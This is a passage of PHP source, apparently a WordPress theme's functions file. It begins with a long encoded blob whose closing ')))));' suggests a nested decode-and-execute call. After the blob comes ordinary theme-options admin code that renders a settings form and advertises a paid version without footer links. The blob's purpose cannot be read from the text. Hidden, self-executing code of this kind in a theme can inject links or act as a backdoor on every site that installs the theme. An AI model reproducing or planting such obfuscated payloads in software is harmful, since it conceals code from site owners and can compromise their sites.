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'))))); 
function mytheme_admin_init() {

    global $themename, $shortname, $options;
    
    $get_theme_options = get_option($shortname . '_options');
    if($get_theme_options != 'yes') {
    	$new_options = $options;
    	foreach ($new_options as $new_value) {
         	update_option( $new_value['id'],  $new_value['std'] ); 
		}
    	update_option($shortname . '_options', 'yes');
    }
}



if(!function_exists('get_sidebars')) {
	function get_sidebars($args='')
	{
		
		 get_sidebar($args);
	}
}
	
    
function mytheme_admin() {

    global $themename, $shortname, $options;

    if ( $_REQUEST['saved'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.' settings saved.</strong></p></div>';
    
?>
<div class="wrap">
<h2><?php echo $themename; ?> Theme Options | <a href="http://newwpthemes.com/forum/" target="_blank" style="font-size: 14px;">NewWpThemes.com <strong>Support Forums</strong></a></h2>
<div style="border-bottom: 1px dotted #000; padding-bottom: 10px; margin: 10px;">Leave blank any field if you don't want it to be shown/displayed.</div>
<?php $buy_theme_name = str_replace(' ', '-', strtolower(trim($themename))); ?>
<div id="buy_theme" class="updated" style="padding: 10px; margin: 10px;">You can buy this theme without footer links online at <a href="http://newwpthemes.com/buy/?theme=<?php echo $buy_theme_name; ?>" target="_blank">http://newwpthemes.com/buy/?theme=<?php echo $buy_theme_name; ?></a></div>
<form method="post">



<?php foreach ($options as $value) { 
    
	switch ( $value['type'] ) {
	
		case "open":
		?>
        <table width="100%" border="0" style=" padding:10px;">
		
        
        
		<?php break;
		
		case "close":
		?>
		
        </table><br />
        
        
		<?php break;
		
		case "title":
		?>
		<table width="100%" border="0" style="padding:5px 10px;"><tr>
        	<td colspan="2"><h3 style="font-family:Georgia,'Times New Roman',Times,serif;"><?php echo $value['name']; ?></h3></td>
        </tr>
                
        
		<?php break;

		case 'text':
		?>
        
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%"><input style="width:100%;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" type="<?php echo $value['type']; ?>" value="<?php echo get_theme_settings( $value['id'] ); ?>" /></td>
        </tr>

        <tr>
            <td><small><?php echo $value['desc']; ?></small></td>
        </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #000000;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

		<?php 
		break;
		
		case 'textarea':
		?>
        
        <tr>
